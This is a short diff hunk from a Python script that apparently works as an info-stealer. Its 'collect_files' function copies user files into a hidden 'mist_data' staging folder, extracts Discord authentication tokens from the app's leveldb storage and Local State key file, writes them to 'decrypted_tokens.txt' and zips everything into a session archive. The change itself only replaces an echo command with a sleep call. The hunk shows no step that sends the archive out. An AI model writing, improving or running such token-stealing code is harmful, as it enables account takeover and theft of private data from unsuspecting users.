@@ -42,7 +42,7 @@ def collect_files(paths, session):
                 os.popen(f'robocopy "{file}" "%USERPROFILE%\\Documents\\mist_data\\{group}\\{file.split("\\")[-1]}" /e')
             else:
                 os.popen(f'copy "{file}" "%USERPROFILE%\\Documents\\mist_data\\{group}\\{file.split("\\")[-1]}"')
-    os.popen('echo " > %USERPROFILE%\\Documents\\mist_data\\Discord\\decrypted_tokens.txt')
+    time.sleep(5)
     open(f'{os.environ["USERPROFILE"]}\\Documents\\mist_data\\Discord\\decrypted_tokens.txt', 'w').write(''.join(extract_tokens(f'{os.environ["USERPROFILE"]}\\AppData\\Roaming\\discord\\Local Storage\\leveldb', f'{os.environ["USERPROFILE"]}\\AppData\\Roaming\\discord\\Local State')))
     shutil.make_archive(session, 'zip', f'{os.environ["USERPROFILE"]}\\Documents\\mist_data')
     time.sleep(2)
